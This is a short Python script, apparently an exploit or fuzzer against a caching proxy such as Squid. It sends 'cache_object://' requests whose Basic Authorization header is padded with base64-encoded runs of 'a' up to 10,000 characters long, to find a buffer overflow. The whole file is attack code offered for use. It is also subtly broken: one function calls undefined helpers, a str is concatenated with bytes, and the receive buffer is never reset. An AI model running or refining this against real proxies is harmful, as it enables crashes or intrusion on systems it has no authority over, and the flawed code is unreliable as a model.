#!/usr/bin/python
import argparse
import socket
import base64

class AttackSocket():

    def __init__(self, url, port):
        self.socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket1.connect((url, port))
        self.chunks = []

    def send(self, data):
        self.data_bytes = data.encode('utf-8')
        self.total_sent_bytes = 0
        while(self.total_sent_bytes < len(self.data_bytes)):
            self.sent = self.socket1.send(self.data_bytes[self.total_sent_bytes:])
            if self.sent == 0:
                raise RuntimeError("socket connection broken.")
            self.total_sent_bytes += self.sent

    def receive(self):
        while True:
            self.data_bytes_recv = self.socket1.recv(4096)
            self.chunks.append(self.data_bytes_recv)
            if len(self.data_bytes_recv) < 4096: break
        return b''.join(self.chunks)


class Payload():

    def __init__(self, url):
        self.url = url
        self.template = 'GET cache_object://{}/info HTTP/1.0\r\nHost: {}\r\nAuthorization: Basic '.format(url, url)

    def payload(self, n):
        self.characters = 'a' * n
        self.characters_base_64 = base64.b64encode(self.characters.encode('utf-8'))
        return self.template + self.characters_base_64 + '\r\n\r\n'


### Iteration ###

# loop increasing overflow with each iteration.
def find_overflow():
    # loop through integers.
    # create string of int * string overflow.
    get_header()
    # send to socket
    send_socket()
    # wait for response or no response
    receive_socket()
### cmd parser ###
# url
# port
class ParseArguments():

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-u", "--url", help="url of proxy.")
        parser.add_argument("-p", "--port", help="proxy port.", type=int)
        args = parser.parse_args()
        self.url = args.url
        self.port = args.port

    def get_url(self):
        return self.url

    def get_port(self):
        return self.port

def main():
    command_args = ParseArguments()
    url = command_args.get_url()
    port = command_args.get_port()
    test_socket = AttackSocket(url, port)
    test_payload = Payload(url)
    for i in range(4000, 10000):
        payload = test_payload.payload(i)
        test_socket.send(payload)
        recv_bytes = test_socket.receive()
        if(recv_bytes):
            print(i)

if __name__ == "__main__":
    main()
